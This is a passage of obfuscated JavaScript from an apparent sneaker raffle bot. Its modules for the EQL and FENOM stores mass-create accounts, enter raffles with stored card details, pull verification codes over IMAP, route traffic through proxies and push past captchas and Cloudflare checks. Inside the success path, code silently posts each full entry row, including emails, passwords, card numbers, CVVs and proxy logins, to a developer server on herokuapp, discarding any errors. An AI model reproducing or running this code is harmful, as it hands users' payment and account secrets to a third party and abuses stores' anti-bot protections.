                                    _0x7d8dbf['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x47f85c[_0x192b4f]['Email'] + ',' + _0x47f85c[_0x192b4f]['Password'] + ',' + _0x47f85c[_0x192b4f]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x54f3c1() {
                                var _0x47a06f, _0x26ce98 = ![];
                                for (var _0x155981 = 0x0; _0x155981 < 0x18; _0x155981++) {
                                    async function _0xd5ceec() {
                                        var _0x22cb0d = new _0x3dffcd({
                                            'user': _0x5450ed['masterMail'],
                                            'password': _0x5450ed['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x237893(_0x1124b9) {
                                            _0x22cb0d['openBox']('INBOX', ![], _0x1124b9);
                                        }
                                        _0x22cb0d['once']('ready', function () {
                                            console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x237893(function (_0x40b241, _0x352bc4) {
                                                console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x40b241)
                                                    throw _0x40b241;
                                                _0x22cb0d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x1f899d, _0x47ecf7) {
                                                    if (!_0x47ecf7 || !_0x47ecf7['length'])
                                                        console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x22cb0d['end']();
                                                    else {
                                                        var _0x155fea = _0x22cb0d['seq']['fetch'](_0x47ecf7, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x155fea['on']('message', function (_0x122e81, _0x463b67) {
                                                            var _0x20a739 = '(#' + _0x463b67 + ')\x20';
                                                            _0x122e81['on']('body', function (_0x5df666, _0x476979) {
                                                                _0x255d24(_0x5df666, (_0x233947, _0x5b93d8) => {
                                                                    if (_0x5b93d8['subject']['includes']('code')) {
                                                                        const _0x48a492 = _0x5b93d8['text']['split']('\x0a\x0a')[0x3], _0x23e93f = _0x48a492['split']('\x0a')[0x1];
                                                                        _0x47a06f = _0x23e93f;
                                                                    }
                                                                });
                                                            }), _0x122e81['once']('end', function () {
                                                            });
                                                        }), _0x155fea['once']('error', function (_0x1140be) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x155fea['once']('end', function () {
                                                            _0x22cb0d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x22cb0d['once']('error', function (_0x473d98) {
                                            console['log'](_0x387ef2['red'](_0x473d98['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x26ce98 = !![];
                                        }), _0x22cb0d['once']('end', async function () {
                                        }), _0x22cb0d['connect']();
                                    }
                                    _0xd5ceec(), await _0x488ffe(0x1388);
                                    if (_0x47a06f)
                                        return _0x47a06f;
                                    if (_0x26ce98)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x155981 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x54f3c1(), await _0x488ffe(0x1f4), await _0x18a5c7['type']('#code', '' + code), await _0x488ffe(0x3e8), await _0x18a5c7['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x416551 => _0x416551['click']()), await _0x18a5c7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x18a5c7['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x47f85c[_0x192b4f]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x7d8dbf['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x47f85c[_0x192b4f]['Email'] + ',' + _0x47f85c[_0x192b4f]['Password'] + ',' + _0x47f85c[_0x192b4f]['Phone']), _0x4e14ae = 'no', _0xb5b21(_0x47f85c[_0x192b4f], _0x128f73);
                            var _0x356b1b = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', ![]), _0x3bf6c6 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'pub', ![]);
                            let _0x18d8ce = _0x47f85c[_0x192b4f];
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0x128f73['name'],
                                    'entrydata': JSON['stringify'](_0x18d8ce),
                                    'proxy': '' + _0x399f06[_0x192b4f]
                                };
                                var _0xa76bfb = JSON['stringify'](prxdata);
                                let _0x1f2e53 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0xa76bfb, _0x1f2e53);
                            } catch (_0xc9b9a1) {
                            }
                            const _0xf3f855 = {
                                'succesDEVMSG': { 'embeds': [_0x356b1b] },
                                'succesPUBMSG': { 'embeds': [_0x3bf6c6] }
                            };
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0xf3f855['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0xf3f855['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0xf3f855['succesPUBMSG']);
                            } catch (_0x1b8497) {
                                console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1b8497));
                            }
                        } catch (_0x527c38) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20' + _0x527c38)), _0x1f0b0d = '' + _0x527c38;
                            var _0x1ef907 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', !![], _0x1f0b0d), _0x356b1b = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', ![]), _0x3bf6c6 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'pub', ![]);
                            const _0x3cf8c8 = {
                                'succesDEVMSG': { 'embeds': [_0x356b1b] },
                                'succesPUBMSG': { 'embeds': [_0x3bf6c6] }
                            };
                            _0x3cf8c8['errorDEV'] = { 'embeds': [_0x1ef907] };
                            _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x3cf8c8['errorDEV']);
                            await _0x49f827(_0x47580b, _0x3cf8c8['errorDEV']);
                            if (!_0x4e14ae == 'no')
                                _0x4e14ae = 'yes';
                        } finally {
                            _0x42ec8 && _0x42ec8['close']();
                            if (_0x4e14ae == 'yes' && _0x257a72 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Retrying\x20(' + _0x257a72 + '\x20/\x205)')), _0x192b4f = _0x192b4f - 0x1, _0x257a72 = _0x257a72 + 0x1;
                                continue;
                            }
                            _0x4e14ae == 'yes' && _0x257a72 >= 0x5 && (_0x2e6413(_0x47f85c[_0x192b4f], _0x128f73), _0x4e14ae = 'no', _0x257a72 = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    } else {
                        const _0x374bc6 = '' + _0x47f85c[_0x192b4f]['Url'];
                        if (_0x4e14ae != 'yes')
                            var _0x4e14ae = '', _0x257a72 = 0x0;
                        if (_0x47f85c[_0x192b4f]['Email'] == '' || _0x47f85c[_0x192b4f]['FirstName'] == '' || _0x47f85c[_0x192b4f]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x47f85c[_0x192b4f]['Password'] == '' && (_0x47f85c[_0x192b4f]['Password'] = 'JRaffles23!');
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x3dafc2 = _0x399f06[_0x192b4f]['split'](':');
                        else
                            var _0xa11581 = Math['round'](Math['random']() * (_0x399f06['length'] - 0x1)), _0x3dafc2 = _0x399f06[_0xa11581]['split'](':');
                        var _0x42ec8;
                        try {
                            _0x42ec8 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dafc2[0x0] + ':' + _0x3dafc2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x42ec8 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dafc2[0x0] + ':' + _0x3dafc2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x59f468 = await _0x42ec8['newPage']();
                            await _0x59f468['authenticate']({
                                'username': '' + _0x3dafc2[0x2],
                                'password': '' + _0x3dafc2[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x59f468['setRequestInterception'](!![]), _0x59f468['on']('request', _0x228ca1 => {
                                _0x228ca1['resourceType']() === 'image' || _0x228ca1['resourceType']() === 'font' || _0x228ca1['resourceType']() === 'media' ? _0x228ca1['abort']() : _0x228ca1['continue']();
                            }), await _0x59f468['goto'](_0x374bc6), await _0x59f468['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x59f468['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x488ffe(0x7d0), await _0x59f468['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x59f468['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x488ffe(0x3e8), await _0x59f468['waitForSelector']('#email'), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x59f468['type']('#email', '' + _0x47f85c[_0x192b4f]['Email']), await _0x488ffe(0x352), await _0x59f468['waitForSelector']('#password'), await _0x59f468['type']('#password', '' + _0x47f85c[_0x192b4f]['Password']), await _0x488ffe(0x352), await _0x59f468['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x488ffe(0x3e8);
                            try {
                                await _0x59f468['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0xb5b21(_0x47f85c[_0x192b4f], _0x128f73), _0x4e14ae = 'no';
                                continue;
                            }
                            await _0x59f468['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x488ffe(0x3e8), await _0x59f468['click']('li[data-value=\x22EU\x20' + _0x47f85c[_0x192b4f]['Size'] + '\x22]'), await _0x488ffe(0x1f4), await _0x59f468['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x59f468['focus']('#postcode'), await _0x59f468['keyboard']['down']('Control'), await _0x59f468['keyboard']['press']('A'), await _0x59f468['keyboard']['up']('Control'), await _0x59f468['keyboard']['press']('Backspace'), await _0x59f468['keyboard']['type'](_0x47f85c[_0x192b4f]['Zip']), await _0x488ffe(0x60e), await _0x59f468['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x488ffe(0x3e8), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x59f468['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x59f468['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x59f468['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x488ffe(0x4b0), await _0x59f468['keyboard']['type']('' + _0x47f85c[_0x192b4f]['CardNumber']), await _0x488ffe(0x320), await _0x59f468['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x59f468['keyboard']['type']('' + _0x47f85c[_0x192b4f]['ExpiryDate']), await _0x488ffe(0x4b0), await _0x59f468['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x59f468['keyboard']['type']('' + _0x47f85c[_0x192b4f]['CVV']), await _0x488ffe(0x226), await _0x59f468['type']('input[name=\x22postalCode\x22]', '' + _0x47f85c[_0x192b4f]['Zip']), await _0x488ffe(0x226), await _0x59f468['click']('#paymentConsent'), await _0x488ffe(0x226), await _0x59f468['click']('#termsConsent'), await _0x488ffe(0x2bc), console['log'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x59f468['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x488ffe(0x2710);
                            try {
                                await _0x59f468['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x488ffe(0xbb8), await _0x59f468['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3b9026 => _0x3b9026['click']()), await _0x59f468['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x43c817 => _0x43c817['click']());
                            } catch {
                            }
                            try {
                                await _0x59f468['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Raffle\x20Entered')), _0xb5b21(_0x47f85c[_0x192b4f], _0x128f73);
                            var _0x356b1b = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', ![]), _0x3bf6c6 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'pub', ![]);
                            let _0x3a5dc9 = _0x47f85c[_0x192b4f];
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0x128f73['name'],
                                    'entrydata': JSON['stringify'](_0x3a5dc9),
                                    'proxy': '' + _0x399f06[_0x192b4f]
                                };
                                var _0xa76bfb = JSON['stringify'](prxdata);
                                let _0x333852 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0xa76bfb, _0x333852);
                            } catch (_0x16d276) {
                            }
                            const _0x389702 = {
                                'succesDEVMSG': { 'embeds': [_0x356b1b] },
                                'succesPUBMSG': { 'embeds': [_0x3bf6c6] }
                            };
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x389702['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x389702['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x389702['succesPUBMSG']);
                            } catch (_0x496614) {
                                console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x496614));
                            }
                            _0x4e14ae = 'no';
                        } catch (_0x436d2d) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20' + _0x436d2d)), _0x1f0b0d = '' + _0x436d2d;
                            var _0x1ef907 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', !![], _0x1f0b0d), _0x356b1b = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'dev', ![]), _0x3bf6c6 = await _0x5605d8(_0x47f85c[_0x192b4f], _0x128f73, 'pub', ![]);
                            const _0x383039 = {
                                'succesDEVMSG': { 'embeds': [_0x356b1b] },
                                'succesPUBMSG': { 'embeds': [_0x3bf6c6] }
                            };
                            _0x383039['errorDEV'] = { 'embeds': [_0x1ef907] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x383039['errorDEV']), await _0x49f827(_0x47580b, _0x383039['errorDEV']), _0x4e14ae = 'yes';
                        } finally {
                            _0x42ec8 && _0x42ec8['close']();
                            if (_0x4e14ae == 'yes' && _0x257a72 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x128f73['name'] + ']\x20Task\x20' + (_0x192b4f + 0x1) + '\x20:\x20Retrying\x20(' + _0x257a72 + '\x20/\x205)')), _0x192b4f = _0x192b4f - 0x1, _0x257a72 = _0x257a72 + 0x1;
                                continue;
                            }
                            _0x4e14ae == 'yes' && _0x257a72 >= 0x5 && (_0x2e6413(_0x47f85c[_0x192b4f], _0x128f73), _0x4e14ae = 'no', _0x257a72 = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0xf2200a, _0x233278, _0x8d8be7) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x41a4c8 = 0x0; _0x41a4c8 < _0x233278['length']; _0x41a4c8++) {
                        if (_0xdd7605 != 'yes')
                            var _0xdd7605 = '', _0x20aa0f = 0x0;
                        var _0x489794;
                        try {
                            await _0x3215be(_0x233278, _0x41a4c8);
                        } catch {
                            _0xdd7605 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x55ca22(_0xf2200a['name'] + '\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20/\x20' + _0x233278['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x5d019a = await _0x5605d8(_0x233278[_0x41a4c8], _0xf2200a, 'acc', ![]);
                        const _0x1dae02 = { 'succesDEVMSG': { 'embeds': [_0x5d019a] } }, _0x2c8498 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x44b262 = Math['round'](Math['random']() * (_0x8d8be7['length'] - 0x1)), _0x229bc8 = _0x8d8be7[_0x44b262]['split'](':'), _0x196066;
                        try {
                            _0x196066 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x229bc8[0x0] + ':' + _0x229bc8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x196066 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x229bc8[0x0] + ':' + _0x229bc8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xcdc50c = await _0x196066['newPage']();
                            await _0xcdc50c['setViewport']({
                                'width': 0x500 + _0x1fafbb(0x1, 0x32),
                                'height': 0x2d9 + _0x1fafbb(0x1, 0x32)
                            });
                            const _0x30e44f = await _0xcdc50c['target']()['createCDPSession'](), { windowId: _0x3548c5 } = await _0x30e44f['send']('Browser.getWindowForTarget');
                            await _0xcdc50c['authenticate']({
                                'username': '' + _0x229bc8[0x2],
                                'password': '' + _0x229bc8[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xcdc50c['goto']('' + _0x2c8498, { 'waitUntil': 'networkidle2' }), console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x488ffe(0x1388);
                            var _0x904bd4 = await _0xcdc50c['$']('.hcaptcha-box');
                            if (_0x904bd4) {
                                console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x488ffe(0x2710);
                                const _0x174dda = await _0xcdc50c['$']('.hcaptcha-box');
                                if (_0x174dda)
                                    try {
                                        await _0x174dda['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0xcdc50c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x3d4185 = await _0xcdc50c['$']('.hcaptcha-box');
                                    if (_0x3d4185)
                                        try {
                                            await _0x3d4185['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0xcdc50c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x30e44f['send']('Browser.setWindowBounds', {
                                    'windowId': _0x3548c5,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x488ffe(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xcdc50c['type']('input[name=\x22firstname\x22]', '' + _0x233278[_0x41a4c8]['FirstName']), await _0x488ffe(0x1f4), await _0xcdc50c['type']('input[name=\x22lastname\x22]', '' + _0x233278[_0x41a4c8]['LastName']), await _0x488ffe(0x1f4), await _0xcdc50c['type']('input[name=\x22email\x22]', '' + _0x233278[_0x41a4c8]['Email']), await _0x488ffe(0x1f4), await _0xcdc50c['type']('input[name=\x22password\x22]', '' + _0x233278[_0x41a4c8]['Password']), await _0x488ffe(0x258), await _0xcdc50c['$eval']('input[name=\x22psgdpr\x22]', _0x2c09c4 => _0x2c09c4['click']()), await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xcdc50c['$eval']('#customer-form', _0x387e99 => _0x387e99['submit']());
                            try {
                                try {
                                    await _0xcdc50c['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0xdd7605 = 'no', console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Account\x20' + _0x233278[_0x41a4c8]['Email'] + '\x20Generated')), _0x7d8dbf['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x233278[_0x41a4c8]['Email'] + ',' + _0x233278[_0x41a4c8]['Password']);
                                let _0x845869 = _0x233278[_0x41a4c8];
                                try {
                                    prxdata = {
                                        'username': _0x15d59c['replace']('#', ''),
                                        'module': _0xf2200a['name'],
                                        'entrydata': JSON['stringify'](_0x845869),
                                        'proxy': '' + _0x8d8be7[_0x41a4c8]
                                    };
                                    var _0xf43608 = JSON['stringify'](prxdata);
                                    let _0x54e825 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0xf43608, _0x54e825);
                                } catch (_0x196950) {
                                }
                                try {
                                    _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1dae02['succesDEVMSG']);
                                } catch {
                                }
                                await _0x49f827(_0x2b5f53, _0x1dae02['succesDEVMSG']);
                            } catch (_0x59772e) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x565ad4) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20' + _0x565ad4)), _0x489794 = '' + _0x565ad4;
                            var _0x14a10d = await _0x5605d8(_0x233278[_0x41a4c8], _0xf2200a, 'acc', !![], _0x489794);
                            _0x1dae02['errorDEV'] = { 'embeds': [_0x14a10d] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1dae02['errorDEV']), await _0x49f827(_0x47580b, _0x1dae02['errorDEV']), _0xdd7605 = 'yes';
                        } finally {
                            _0x196066['close']();
                            if (_0xdd7605 == 'yes' && _0x20aa0f != 0x5 && _0x489794 != 'Size\x20Not\x20Found') {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Task\x20' + (_0x41a4c8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x20aa0f + '\x20/\x205)')), _0x41a4c8 = _0x41a4c8 - 0x1, _0x20aa0f = _0x20aa0f + 0x1;
                                continue;
                            }
                            _0xdd7605 == 'yes' && _0x20aa0f >= 0x5 && (_0x2e6413(_0x233278[_0x41a4c8], _0xf2200a), _0xdd7605 = 'no', _0x20aa0f = 0x0), console['log'](_0x42a46a() + '\x20[' + _0xf2200a['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x19bb18(_0x10be87, _0x9fafbe, _0x42815c) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1cb251 = 0x0; _0x1cb251 < _0x9fafbe['length']; _0x1cb251++) {
                        if (_0x1e222e != 'yes')
                            var _0x1e222e = '', _0x1f8903 = 0x0;
                        var _0x165b95;
                        try {
                            await _0x3215be(_0x9fafbe, _0x1cb251);
                        } catch {
                            _0x1e222e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x55ca22(_0x10be87['name'] + '\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20/\x20' + _0x9fafbe['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        const _0x5906e2 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5757e8 = Math['round'](Math['random']() * (_0x42815c['length'] - 0x1)), _0xa746c6 = _0x42815c[_0x5757e8]['split'](':'), _0x354462;
                        try {
                            _0x354462 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
